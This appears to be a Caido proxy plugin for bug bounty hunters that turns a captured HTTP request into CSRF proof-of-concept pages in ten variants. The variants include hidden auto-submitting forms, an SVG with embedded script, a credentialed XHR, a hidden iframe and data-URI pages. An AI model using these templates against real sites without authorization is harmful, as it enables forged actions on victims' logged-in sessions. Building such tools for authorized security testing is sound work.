export async function init(sdk) {
  //Tur24Tur /BugBountyZip
  const style = document.createElement('style');
  style.textContent = `
    .csrf-modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background-color: rgba(0, 0, 0, 0.85);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }

    .csrf-modal {
      background-color: #1a1a1a;
      border-radius: 12px;
      width: 85%;
      max-width: 1200px;
      max-height: 90vh;
      display: flex;
      flex-direction: column;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.24);
    }

    .csrf-modal-header {
      padding: 20px 24px;
      background-color: #252525;
      border-bottom: 1px solid #333;
      border-radius: 12px 12px 0 0;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .csrf-modal-title {
      color: #00bcd4;
      font-size: 20px;
      font-weight: 600;
      letter-spacing: 0.5px;
    }

    .csrf-modal-close {
      background: none;
      border: none;
      color: #999;
      cursor: pointer;
      font-size: 24px;
      padding: 8px;
      transition: color 0.2s;
    }

    .csrf-modal-close:hover {
      color: #fff;
    }

    .csrf-modal-body {
      padding: 24px;
      overflow-y: auto;
      max-height: calc(90vh - 70px);
    }

    .csrf-options {
      background-color: #252525;
      padding: 20px;
      border-radius: 8px;
      margin-bottom: 24px;
      border: 1px solid #333;
    }

    .csrf-select {
      width: 100%;
      padding: 10px 12px;
      background-color: #2d2d2d;
      color: #fff;
      border: 1px solid #444;
      border-radius: 6px;
      margin-bottom: 12px;
      font-size: 14px;
      transition: border-color 0.2s;
    }

    .csrf-select:hover {
      border-color: #666;
    }

    .csrf-select:focus {
      border-color: #00bcd4;
      outline: none;
    }

    .csrf-checkbox-label {
      display: flex;
      align-items: center;
      gap: 10px;
      color: #ddd;
      font-size: 14px;
    }

    .csrf-output {
      background-color: #252525;
      padding: 20px;
      border-radius: 8px;
      border: 1px solid #333;
    }

    .csrf-output-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 16px;
    }

    .csrf-button-group {
      display: flex;
      gap: 12px;
    }

    .csrf-button {
      padding: 8px 16px;
      border: none;
      border-radius: 6px;
      color: #fff;
      cursor: pointer;
      font-weight: 500;
      font-size: 14px;
      transition: transform 0.1s, opacity 0.2s;
      display: flex;
      align-items: center;
      gap: 6px;
    }

    .csrf-button:hover {
      transform: translateY(-1px);
    }

    .csrf-button:active {
      transform: translateY(0);
    }

        .csrf-button-copy {
      background-color: #a0213e;
    }

    .csrf-button-copy:hover {
      background-color: #a0213e;
    }

    .csrf-button-download {
      background-color: #a0213e;
    }

    .csrf-button-download:hover {
      background-color: #a0213e;
    }


    .csrf-code-editor {
      width: 100%;
      min-height: 300px;
      resize: vertical;
      background-color: #2d2d2d;
      color: #eee;
      border: 1px solid #444;
      border-radius: 6px;
      padding: 16px;
      font-family: 'Fira Code', Consolas, Monaco, monospace;
      font-size: 14px;
      line-height: 1.5;
      tab-size: 2;
      -moz-tab-size: 2;
      outline: none;
      transition: border-color 0.2s;
    }

    .csrf-code-editor:focus {
      border-color: #00bcd4;
    }

    .csrf-footer {
      padding: 16px 24px;
      background-color: #252525;
      border-top: 1px solid #333;
      border-radius: 0 0 12px 12px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .csrf-footer-links {
      display: flex;
      gap: 16px;
    }

    .csrf-footer-link {
      color: #00bcd4;
      text-decoration: none;
      font-size: 14px;
      display: flex;
      align-items: center;
      gap: 6px;
      transition: color 0.2s;
    }

    .csrf-footer-link:hover {
      color: #26c6da;
    }

    .csrf-footer-link svg {
      width: 16px;
      height: 16px;
    }

    [data-tooltip] {
      position: relative;
    }

    [data-tooltip]:hover:after {
      content: attr(data-tooltip);
      position: absolute;
      bottom: 100%;
      left: 50%;
      transform: translateX(-50%);
      padding: 4px 8px;
      background: rgba(0, 0, 0, 0.8);
      color: white;
      font-size: 12px;
      border-radius: 4px;
      white-space: nowrap;
      z-index: 10;
    }
  `;
  document.head.appendChild(style);

  
  const parseRequestParams = (request) => {
    try {
      const lines = request.split('\n');
      let body = '';
      let contentType = '';
      let isBody = false;

      
      for (const line of lines) {
        if (line.toLowerCase().startsWith('content-type:')) {
          contentType = line.split(':')[1].trim();
        }
        if (line.trim() === '') {
          isBody = true;
          continue;
        }
        if (isBody) {
          body += line;
        }
      }

      if (!body.trim()) {
        return [];
      }

      if (contentType.includes('application/json')) {
        try {
          const jsonData = JSON.parse(body);
          return Object.entries(jsonData).map(([name, value]) => ({
            name,
            value: typeof value === 'object' ? JSON.stringify(value) : String(value)
          }));
        } catch (e) {
          console.error('JSON parsing failed:', e);
          return [];
        }
      }

      return body.split('&')
        .filter(param => param.includes('='))
        .map(param => {
          const [name, ...values] = param.split('=');
          return {
            name: decodeURIComponent(name),
            value: decodeURIComponent(values.join('='))
          };
        });
      } catch (error) {
          console.error('Parameter parsing error:', error);
          return [];
        }
      };
  
   
    const generateStandardPoc = (method, url, params, autoSubmit) => {
      const formFields = params.map(({name, value}) => 
        `    <input type="hidden" name="${name}" value="${value}" />`
      ).join('\n');
  
      return `<!DOCTYPE html>
  <html>
  <head>
      <title>CSRF PoC</title>
  </head>
  <body>
      <h3>Standard CSRF PoC</h3>
      <form action="${url}" method="${method.toLowerCase()}">
  ${formFields}
          <input type="submit" value="Submit request" />
      </form>
      ${autoSubmit ? `<script>
          history.pushState('', '', '/');
          document.forms[0].submit();
      </script>` : ''}
  </body>
  </html>`;
    };
  
    const generateUrlEncodedCsrf = (method, url, params, autoSubmit) => {
      const formFields = params.map(({name, value}) => 
        `    <input type="hidden" name="${name}" value="${value}" />`
      ).join('\n');
  
      return `<!DOCTYPE html>
  <html>
  <head>
      <title>CSRF PoC</title>
  </head>
  <body>
      <h3>URL-encoded CSRF PoC</h3>
      <form action="${url}" method="${method.toLowerCase()}" enctype="application/x-www-form-urlencoded">
  ${formFields}
          <input type="submit" value="Submit request" />
      </form>
      ${autoSubmit ? `<script>
          history.pushState('', '', '/');
          document.forms[0].submit();
      </script>` : ''}
  </body>
  </html>`;
    };
  
    const generateMultipartCsrf = (method, url, params, autoSubmit) => {
      const boundary = '----WebKitFormBoundary' + Math.random().toString(36).slice(2);
      const formFields = params.map(({name, value}) => 
        `    <input type="hidden" name="${name}" value="${value}" />`
      ).join('\n');
  
      return `<!DOCTYPE html>
  <html>
  <head>
      <title>CSRF PoC</title>
  </head>
  <body>
      <h3>Multipart CSRF PoC</h3>
      <form action="${url}" method="${method.toLowerCase()}" enctype="multipart/form-data">
  ${formFields}
          <input type="submit" value="Submit request" />
      </form>
      ${autoSubmit ? `<script>
          history.pushState('', '', '/');
          document.forms[0].submit();
      </script>` : ''}
  </body>
  </html>`;
    };
  
    const generatePlainTextCsrf = (method, url, params, autoSubmit) => {
      const rawBody = params.map(({name, value}) => `${name}=${value}`).join('\n');
  
      return `<!DOCTYPE html>
  <html>
  <head>
      <title>CSRF PoC</title>
  </head>
  <body>
      <h3>Plain Text CSRF PoC</h3>
      <form action="${url}" method="${method.toLowerCase()}" enctype="text/plain">
          <input type="hidden" name="${rawBody}" value="" />
          <input type="submit" value="Submit request" />
      </form>
      ${autoSubmit ? `<script>
          history.pushState('', '', '/');
          document.forms[0].submit();
      </script>` : ''}
  </body>
  </html>`;
    };
  
    const generateSvgCsrf = (method, url, params, size = 200) => {
      const formFields = params.map(({name, value}) => 
        `<input type="hidden" name="${name}" value="${value}">`
      ).join('');
  
      return `<?xml version="1.0" standalone="no"?>
  <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
  <svg width="${size}" height="${size}" version="1.1" xmlns="http://www.w3.org/2000/svg">
      <rect width="${size}" height="${size}" fill="#f0f0f0"/>
      <circle cx="${size/2}" cy="${size/2}" r="${size/3}" fill="#ddd"/>
      <text x="${size/2}" y="${size/2}" text-anchor="middle" font-family="Arial" fill="#666">Loading...</text>
      
      <script type="text/javascript"><![CDATA[
          function submitCSRF() {
              var w = window.open('about:blank', '_blank');
              w.document.write(\`
                  <html>
                  <body>
                      <form method="${method.toLowerCase()}" action="${url}">
                          ${formFields}
                      </form>
                      <script>
                          document.forms[0].submit();
                      <\/script>
                  </body>
                  </html>
              \`);
              w.document.close();
          }
          submitCSRF();
      ]]></script>
  </svg>`;
    };
  
    const generateXhrCsrf = (method, url, params, autoSubmit) => {
      const paramString = params.map(({name, value}) => 
        `${encodeURIComponent(name)}=${encodeURIComponent(value)}`
      ).join('&');
  
      return `<!DOCTYPE html>
  <html>
  <head>
      <title>CSRF PoC</title>
  </head>
  <body>
      <h3>XHR CSRF PoC</h3>
      <script>
      function sendXHR() {
          var xhr = new XMLHttpRequest();
          xhr.open("${method.toLowerCase()}", "${url}", true);
          xhr.withCredentials = true;
          xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
          xhr.send("${paramString}");
      }
      ${autoSubmit ? 'sendXHR();' : ''}
      </script>
      <button onclick="sendXHR()">Send Request</button>
  </body>
  </html>`;
    };

const generateIframeCsrf = (method, url, params, autoSubmit) => {
  const formFields = params.map(({name, value}) => 
    `    <input type="hidden" name="${name}" value="${value}" />`
  ).join('\n');

  return `<!DOCTYPE html>
<html>
<head>
  <title>CSRF PoC</title>
</head>
<body>
  <h3>Iframe CSRF PoC</h3>
  <iframe id="csrf-frame" style="display:none"></iframe>
  <form id="csrf-form" target="csrf-frame" action="${url}" method="${method.toLowerCase()}">
${formFields}
  </form>
  <script>
      function submitForm() {
          document.getElementById('csrf-form').submit();
          setTimeout(() => {
              document.getElementById('csrf-frame').remove();
          }, 1000);
      }
      ${autoSubmit ? 'submitForm();' : ''}
  </script>
  <button onclick="submitForm()">Submit Request</button>
</body>
</html>`;
};

const generateMetaRefreshCsrf = (method, url, params) => {
  const formFields = params.map(({name, value}) => 
    `<input type="hidden" name="${name}" value="${value}">`
  ).join('');

  return `<!DOCTYPE html>
<html>
<head>
  <title>CSRF PoC</title>
  <meta http-equiv="refresh" content="0; url=data:text/html;base64,${btoa(`
  <form method="${method.toLowerCase()}" action="${url}">
      ${formFields}
  </form>
  <script>document.forms[0].submit();</script>
  `)}">
</head>
<body>
  <h3>Meta Refresh CSRF PoC</h3>
  <p>If you are not redirected, <a href="#" onclick="document.forms[0].submit()">click here</a></p>
</body>
</html>`;
};

const generateWebSocketCsrf = (method, url, params) => {
  const wsUrl = url.replace('https://', 'wss://').replace('http://', 'ws://');
  const payload = params.map(({name, value}) => `${name}=${value}`).join('&');

  return `<!DOCTYPE html>
<html>
<head>
  <title>CSRF PoC</title>
</head>
<body>
  <h3>WebSocket CSRF PoC</h3>
  <script>
      var ws = new WebSocket("${wsUrl}");
      ws.onopen = function() {
          ws.send("${payload}");
          setTimeout(() => ws.close(), 1000);
      };
  </script>
</body>
</html>`;
};

const generateDataUriCsrf = (method, url, params, autoSubmit) => {
  const formFields = params.map(({name, value}) => 
    `    <input type="hidden" name="${name}" value="${value}" />`
  ).join('\n');

  const html = `<!DOCTYPE html>
<html>
<head>
  <title>CSRF PoC</title>
</head>
<body>
  <h3>Data URI CSRF PoC</h3>
  <form action="${url}" method="${method.toLowerCase()}">
${formFields}
  </form>
  ${autoSubmit ? '<script>document.forms[0].submit();</script>' : ''}
</body>
</html>`;

  return `<script>window.location='data:text/html;base64,${btoa(html)}';</script>`;
};

const addModalKeyboardHandling = (overlay) => {
  const handleKeydown = (e) => {
    if (e.key === 'Escape') {
      overlay.remove();
      document.removeEventListener('keydown', handleKeydown);
    }
  };
  document.addEventListener('keydown', handleKeydown);
};


const showCsrfModal = (request, url, method) => {
  const params = parseRequestParams(request);
  
  if (params.length === 0) {
    sdk.window.showToast('No parameters found in request', { variant: 'warning' });
  }
  
  const overlay = document.createElement('div');
  overlay.className = 'csrf-modal-overlay';
  
  overlay.addEventListener('click', (e) => {
    if (e.target === overlay) {
      overlay.remove();
    }
  });
  
  addModalKeyboardHandling(overlay);
  
  const modal = document.createElement('div');
  modal.className = 'csrf-modal';
  modal.addEventListener('click', (e) => e.stopPropagation());
  
  const header = document.createElement('div');
  header.className = 'csrf-modal-header';
  
  const title = document.createElement('div');
  title.className = 'csrf-modal-title';
  title.textContent = 'Advanced CSRF PoC Generator';
  
  const closeButton = document.createElement('button');
  closeButton.className = 'csrf-modal-close';
  closeButton.innerHTML = '&times;';
  closeButton.onclick = () => overlay.remove();
  
  header.appendChild(title);
  header.appendChild(closeButton);
  
  const body = document.createElement('div');
  body.className = 'csrf-modal-body';
  
  const options = document.createElement('div');
  options.className = 'csrf-options';
  
  const select = document.createElement('select');
  select.className = 'csrf-select';
  
  const techniques = [
    "Standard HTML Form",
    "URL-encoded form",
    "Multipart form",
    "Plain text form",
    "SVG-based CSRF",
    "XHR-based CSRF",
    "Iframe-based CSRF",
    "Meta Refresh CSRF",
    "WebSocket CSRF",
    "Data URI CSRF"
  ];
  
  techniques.forEach(tech => {
    const option = document.createElement('option');
    option.value = tech;
    option.textContent = tech;
    select.appendChild(option);
  });

  const checkboxLabel = document.createElement('label');
  checkboxLabel.className = 'csrf-checkbox-label';
  
  const checkbox = document.createElement('input');
  checkbox.type = 'checkbox';
  checkbox.checked = true;
  
  checkboxLabel.appendChild(checkbox);
  checkboxLabel.appendChild(document.createTextNode('Include auto-submit script (where applicable)'));

  options.appendChild(select);
  options.appendChild(checkboxLabel);

  const updateOutput = () => {
    let poc;
    
    switch(select.value) {
      case "URL-encoded form":
        poc = generateUrlEncodedCsrf(method, url, params, checkbox.checked);
        break;
      case "Multipart form":
        poc = generateMultipartCsrf(method, url, params, checkbox.checked);
        break;
      case "Plain text form":
        poc = generatePlainTextCsrf(method, url, params, checkbox.checked);
        break;
      case "SVG-based CSRF":
        poc = generateSvgCsrf(method, url, params, 200);
        break;
      case "XHR-based CSRF":
        poc = generateXhrCsrf(method, url, params, checkbox.checked);
        break;
      case "Iframe-based CSRF":
        poc = generateIframeCsrf(method, url, params, checkbox.checked);
        break;
      case "Meta Refresh CSRF":
        poc = generateMetaRefreshCsrf(method, url, params);
        break;
      case "WebSocket CSRF":
        poc = generateWebSocketCsrf(method, url, params);
        break;
      case "Data URI CSRF":
        poc = generateDataUriCsrf(method, url, params, checkbox.checked);
        break;
      default:
        poc = generateStandardPoc(method, url, params, checkbox.checked);
    }

    const output = document.createElement('div');
    output.className = 'csrf-output';
    
    const outputHeader = document.createElement('div');
    outputHeader.className = 'csrf-output-header';
    
    const outputTitle = document.createElement('div');
    outputTitle.textContent = 'Generated PoC:';
    
    const buttonGroup = document.createElement('div');
    buttonGroup.className = 'csrf-button-group';
    
    const copyButton = document.createElement('button');
    copyButton.className = 'csrf-button csrf-button-copy';
    copyButton.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path><rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect></svg>Copy PoC';
    
    const downloadButton = document.createElement('button');
    downloadButton.className = 'csrf-button csrf-button-download';
    downloadButton.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>Download';
    
    const editor = document.createElement('textarea');
    editor.className = 'csrf-code-editor';
    editor.value = poc;
    editor.spellcheck = false;
    
    copyButton.onclick = async () => {
      await navigator.clipboard.writeText(editor.value);
      sdk.window.showToast('CSRF PoC copied to clipboard');
    };
    
    downloadButton.onclick = () => {
      const isSvg = select.value === "SVG-based CSRF";
      const blob = new Blob([editor.value], { 
        type: isSvg ? 'image/svg+xml' : 'text/html' 
      });
      const a = document.createElement('a');
      a.href = URL.createObjectURL(blob);
      a.download = isSvg ? 'csrf-poc.svg' : 'csrf-poc.html';
      a.click();
      URL.revokeObjectURL(a.href);
      sdk.window.showToast(`CSRF PoC downloaded as ${isSvg ? 'SVG' : 'HTML'}`);
    };
    
    buttonGroup.appendChild(copyButton);
    buttonGroup.appendChild(downloadButton);
    
    outputHeader.appendChild(outputTitle);
    outputHeader.appendChild(buttonGroup);
    
    const urlDisplay = document.createElement('div');
    urlDisplay.textContent = `Target URL: ${url}`;
    urlDisplay.style.marginBottom = '12px';
    urlDisplay.style.color = '#888';
    
    output.appendChild(outputHeader);
    output.appendChild(urlDisplay);
    output.appendChild(editor);
    
    return output;
  };

  let currentOutput = updateOutput();
  
  select.addEventListener('change', () => {
    const newOutput = updateOutput();
    currentOutput.replaceWith(newOutput);
    currentOutput = newOutput;
  });

  checkbox.addEventListener('change', () => {
    const newOutput = updateOutput();
    currentOutput.replaceWith(newOutput);
    currentOutput = newOutput;
  });

  const footerLinks = document.createElement('div');
  footerLinks.className = 'csrf-footer-links';

  const discordLink = document.createElement('a');
  discordLink.className = 'csrf-footer-link';
  discordLink.innerHTML = `
    <svg viewBox="0 0 24 24" fill="currentColor">
      <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128c.12-.094.246-.192.372-.292a.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z"/>
    </svg>
    Join Discord Server
  `;
  discordLink.href = '#';
  discordLink.addEventListener('click', (e) => {
    e.preventDefault();
    if (typeof __CAIDO_DESKTOP__ !== 'undefined' && __CAIDO_DESKTOP__.openInBrowser) {
      __CAIDO_DESKTOP__.openInBrowser('https://links.caido.io/www-discord');
    } else {
      window.open('https://links.caido.io/www-discord', '_blank', 'noopener,noreferrer');
    }
  });

  const contactLink = document.createElement('a');
  contactLink.className = 'csrf-footer-link';
  contactLink.innerHTML = `
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
      <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/>
      <path d="M22 6l-10 7L2 6"/>
    </svg>
    Contact Me
  `;
  contactLink.href = '#';
  contactLink.addEventListener('click', (e) => {
    e.preventDefault();
    if (typeof __CAIDO_DESKTOP__ !== 'undefined' && __CAIDO_DESKTOP__.openInBrowser) {
      __CAIDO_DESKTOP__.openInBrowser('https://x.com/Tur24Tur');
    } else {
      window.open('https://x.com/Tur24Tur', '_blank', 'noopener,noreferrer');
    }
  });

  const versionInfo = document.createElement('div');
  versionInfo.style.color = '#666';
  versionInfo.style.fontSize = '12px';
  versionInfo.textContent = 'CSRF PoC Generator v1.0.0';

  footerLinks.appendChild(discordLink);
  footerLinks.appendChild(contactLink);

  const footer = document.createElement('div');
  footer.className = 'csrf-footer';
  footer.appendChild(footerLinks);
  footer.appendChild(versionInfo);

  body.appendChild(options);
  body.appendChild(currentOutput);
  modal.appendChild(header);
  modal.appendChild(body);
  modal.appendChild(footer);
  overlay.appendChild(modal);
  document.body.appendChild(overlay);
};

sdk.commands.register('generate-csrf-poc', {
  name: 'Generate CSRF PoC',
  run: async (context) => {
    try {
      const request = context.request?.raw;
      if (!request) {
        sdk.window.showToast('No request selected', { variant: 'error' });
        return;
      }

      const firstLine = request.split('\n')[0];
      const method = firstLine.split(' ')[0];
      const urlMatch = request.match(/^(?:POST|GET|PUT|DELETE)\s+(.*?)\s+HTTP/);
      const path = urlMatch ? urlMatch[1] : '';
      const hostMatch = request.match(/Host:\s*([^\r\n]+)/i);
      const host = hostMatch ? hostMatch[1].trim() : '';
      const fullUrl = path.startsWith('http') ? path : `https://${host}${path}`;

      showCsrfModal(request, fullUrl, method);

    } catch (error) {
      sdk.window.showToast(`Error: ${error.message}`, { variant: 'error' });
      console.error(error);
    }
  }
});

sdk.menu.registerItem({
  type: 'Request',
  commandId: 'generate-csrf-poc',
});

sdk.menu.registerItem({
  type: 'RequestRow',
  commandId: 'generate-csrf-poc',
});
}
